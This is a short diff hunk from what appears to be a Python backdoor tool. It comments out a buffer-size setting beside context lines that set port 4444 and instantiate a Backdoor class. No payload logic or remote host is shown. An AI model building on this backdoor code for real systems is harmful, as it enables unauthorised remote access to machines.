@@ -83,7 +83,7 @@ class Backdoor:
 #buffer_size = int(raw_input("Enter buffer size: "))
 ip = " "
 port = 4444
-buffer_size = 1024
+#buffer_size = 1024
 
 try:
     my_backdoor = Backdoor(ip, port)
